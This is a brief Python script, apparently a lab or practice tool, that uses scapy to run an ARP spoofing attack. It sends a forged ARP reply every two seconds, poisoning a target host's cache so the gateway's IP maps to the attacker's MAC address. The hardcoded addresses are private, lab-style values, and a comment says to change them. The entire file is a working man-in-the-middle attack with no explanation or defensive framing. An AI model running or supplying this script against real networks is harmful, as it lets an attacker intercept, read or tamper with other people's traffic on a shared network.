from scapy.all import ARP, send
import time

def arp_spoof(target_ip, target_mac, gateway_ip, attacker_mac):
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=attacker_mac)
    send(packet, verbose=False)

# IP & MAC addresses to be changed
target_ip = "192.168.79.155" 
target_mac = "00:0c:29:63:f3:b4"
gateway_ip = "192.168.79.2"
attacker_mac = "00:0c:29:9f:95:15"

try:
    while True:
        arp_spoof(target_ip, target_mac, gateway_ip, attacker_mac)
        time.sleep(2)
except KeyboardInterrupt:
    print("END")